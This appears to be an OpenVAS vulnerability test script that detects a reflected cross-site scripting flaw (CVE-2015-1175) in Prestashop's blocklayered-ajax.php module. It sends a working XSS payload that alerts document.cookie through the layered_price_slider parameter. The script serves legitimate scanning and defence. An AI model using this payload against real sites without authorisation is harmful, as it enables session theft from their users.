###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_prestashop_xss_vuln.nasl 11974 2018-10-19 06:22:46Z cfischer $
#
# Prestashop Reflected Cross Site Scripting Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805445");
  script_version("$Revision: 11974 $");
  script_cve_id("CVE-2015-1175");
  script_bugtraq_id(71655);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-19 08:22:46 +0200 (Fri, 19 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-12-17 16:59:56 +0530 (Wed, 17 Dec 2014)");
  script_tag(name:"qod_type", value:"remote_analysis");
  script_name("Prestashop Reflected Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Prestashop
  and is prone to cross site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET
  request and check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"This flaw exists because
  /modules/blocklayered/blocklayered-ajax.php script does not validate input to
  the 'layered_price_slider' parameter before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attacker to create a specially crafted request that would execute arbitrary
  script code in a user's browser session within the trust relationship
  between their browser and the server.");

  script_tag(name:"affected", value:"Prestashop version 1.6.0.9 and earlier.");

  script_tag(name:"solution", value:"Upgrade to 1.6.0.11 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/130026");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/534511/100/0/threaded");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_xref(name:"URL", value:"https://www.prestashop.com");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

presPort = get_http_port(default:80);
if(!can_host_php(port:presPort)){
  exit(0);
}

host = http_host_name( port:presPort );

foreach dir (make_list_unique("/", "/prestashop", cgi_dirs(port:presPort)))
{

  if( dir == "/" ) dir = "";
  url = string(dir, "/");
  res = http_get_cache(item:url, port:presPort);

  if(res && 'content="Shop powered by PrestaShop' >< res && '<title>prestashop</title>' >< res)
  {

    url = dir + "/modules/blocklayered/blocklayered-ajax.php?"+
                "layered_id_feature_20=20_7&id_category_layered=8&"+
                "layered_price_slider=16_532f363%3Cimg%20src%3da%20onerror%3dalert%28"+
                "document.cookie%29%3E9c032&orderby=position&orderway=asctrue&_=1420314938300";

    req = string("GET ",url,  " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\r\n");
    res =  http_keepalive_send_recv(port:presPort, data:req);

    ## Extra check is not possible
    if(res =~ "HTTP/1\.. 200" && "alert(document.cookie)" >< res)
    {
       security_message(port:presPort);
       exit(0);
    }
  }
}

exit(99);
